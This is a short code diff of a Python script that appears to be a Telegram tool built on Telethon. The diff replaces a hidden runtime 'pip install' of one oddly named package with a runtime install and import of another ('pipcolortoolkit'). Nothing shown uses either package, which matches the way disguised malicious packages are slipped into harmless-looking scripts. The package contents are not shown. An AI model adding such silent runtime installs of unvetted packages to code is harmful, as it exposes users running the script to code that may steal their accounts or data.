@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontingpkgV1")
-import pyfontingpkgV1
+os.system("pip install pipcolortoolkit")
+import pipcolortoolkit
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
